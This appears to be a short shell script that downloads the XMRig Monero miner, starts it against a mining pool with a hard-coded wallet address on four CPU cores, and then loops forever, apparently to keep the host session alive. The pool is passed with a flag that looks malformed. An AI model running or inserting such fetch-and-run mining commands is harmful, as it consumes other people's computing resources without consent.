#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xf xmrig-6.12.1-linux-x64.tar.gz
./xmrig -c sg.minexmr.com:443 -u 84h13eqbrFgcq5cvbHRKkJVNnhLwM4fxzXtaBuGLHHQEAMibr8Nx9RJcqHzN224dxrcvrkTfbNBwq1MFHj4Btb5A5DjAraR.ego -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
